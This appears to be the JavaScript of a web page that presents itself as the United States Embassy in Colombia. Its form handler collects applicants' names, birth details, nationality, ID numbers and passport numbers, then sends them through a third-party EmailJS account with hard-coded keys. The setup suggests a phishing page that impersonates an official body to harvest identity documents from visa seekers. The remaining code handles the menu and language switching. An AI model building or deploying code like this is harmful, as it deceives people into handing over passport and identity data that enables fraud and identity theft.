// ✅ Inicializar EmailJS
(function () {
    emailjs.init("5hSEIwvwW_P3opzdj"); // Tu Public Key
})();

// Asegurar que los elementos del DOM estén disponibles
window.addEventListener("DOMContentLoaded", function () {
    // ---- Envío del formulario ----
    const form = document.getElementById("formularioEmail");
    const alerta = document.getElementById("alerta");

    if (form) {
        form.addEventListener("submit", function (e) {
            e.preventDefault();

            // Obtener los valores del formulario
            const nombre = document.getElementById('nombre').value.trim();
            // Eliminado: proporcionado
            const fecha_nacimiento = document.getElementById('fecha_nacimiento').value;
            const lugar_nacimiento = document.getElementById('lugar_nacimiento').value;
            const genero = document.getElementById('genero').value;
            const nacionalidad = document.getElementById('nacionalidad').value.trim();
            const numero_documento = document.getElementById('numero_documento').value.trim();
            const numero_pasaporte = document.getElementById('numero_pasaporte').value.trim(); // ✅ NUEVO CAMPO
            const motivo_viaje = document.getElementById('motivo_viaje').value;
            const viaje = document.getElementById('viaje').value;
            const dia = document.getElementById('dia').value;

            // Validación básica
            if (!nombre || !fecha_nacimiento || !lugar_nacimiento || !genero || !nacionalidad || !numero_documento || !numero_pasaporte || !dia) {
                alerta.textContent = "⚠️ Por favor complete todos los campos requeridos.";
                alerta.style.color = "orange";
                return;
            }

            // ---- Enviar con EmailJS (versión 4)
            emailjs.send(
                "service_wcr513g",      // ✅ ID del servicio
                "template_qfns7hm",     // ✅ ID de la plantilla
                {
                    nombre: nombre,
                    // Eliminado: proporcionado
                    fecha_nacimiento: fecha_nacimiento,
                    lugar_nacimiento: lugar_nacimiento,
                    genero: genero,
                    nacionalidad: nacionalidad,
                    numero_documento: numero_documento,
                    numero_pasaporte: numero_pasaporte, // ✅ Enviando el nuevo campo
                    motivo_viaje: motivo_viaje,
                    viaje: viaje,
                    dia: dia,
                    time: new Date().toLocaleString('es-CO', { dateStyle: 'full', timeStyle: 'short' })
                },
                "5hSEIwvwW_P3opzdj"     // Tu Public Key
            )
            .then(() => {
                alerta.textContent = "✅ Tu solicitud fue enviada correctamente. Te contactaremos pronto.";
                alerta.style.color = "green";
                form.reset();
            })
            .catch((error) => {
                console.error("Error EmailJS:", error);
                alerta.textContent = "❌ Hubo un problema al enviar tu solicitud. Inténtalo de nuevo.";
                alerta.style.color = "red";
            });
        });
    }


    // ---- Código de Menú e Idioma (con lógica de cierre mutuo) ----
    const menuToggle = document.getElementById('menu-toggle');
    const dropdownMenu = document.getElementById('dropdown-menu');
    const languageToggle = document.getElementById('language-toggle');
    const languageDropdown = document.getElementById('language-dropdown');
    const languageOptions = document.querySelectorAll('.language-option');

    function toggleMenu() {
        if (dropdownMenu) {
            if (languageDropdown) languageDropdown.classList.remove('show'); // Cierra el de idioma
            dropdownMenu.classList.toggle('show');
        }
    }

    function closeMenu() {
        if (dropdownMenu) dropdownMenu.classList.remove('show');
    }

    function toggleLanguageDropdown(e) {
        e.preventDefault();
        e.stopPropagation();
        if (languageDropdown) {
            if (dropdownMenu) dropdownMenu.classList.remove('show'); // Cierra el principal
            languageDropdown.classList.toggle('show');
        }
    }

    function changeLanguage(lang) {
        const elements = document.querySelectorAll('[data-es][data-en]');
        elements.forEach(el => {
            const text = lang === 'es' ? el.getAttribute('data-es') : el.getAttribute('data-en');
            if (text) el.textContent = text;
        });
        document.title = lang === 'es'
            ? 'Embajada de Estados Unidos en Colombia'
            : 'United States Embassy in Colombia';
        
        if (languageToggle) {
            languageToggle.textContent = lang === 'es' ? 'Idioma ▼' : 'Language ▼';
        }
        
        if (languageDropdown) {
            languageDropdown.classList.remove('show');
        }
        
        localStorage.setItem('selectedLanguage', lang);
    }

    if (menuToggle) menuToggle.addEventListener('click', function(e) { e.preventDefault(); e.stopPropagation(); toggleMenu(); });
    if (languageToggle) languageToggle.addEventListener('click', toggleLanguageDropdown);
    
    languageOptions.forEach(opt => {
        opt.addEventListener('click', e => {
            e.preventDefault();
            e.stopPropagation();
            changeLanguage(opt.getAttribute('data-lang'));
        });
    });

    // Cierre al hacer clic fuera
    document.addEventListener("click", function (e) {
        if (menuToggle && dropdownMenu && !menuToggle.contains(e.target) && !dropdownMenu.contains(e.target)) {
            closeMenu();
        }
        if (languageToggle && languageDropdown && !languageToggle.contains(e.target) && !languageDropdown.contains(e.target)) {
            languageDropdown.classList.remove("show");
        }
    });

    // Aplicar idioma guardado al cargar
    const savedLanguage = localStorage.getItem('selectedLanguage') || 'es';
    changeLanguage(savedLanguage);
});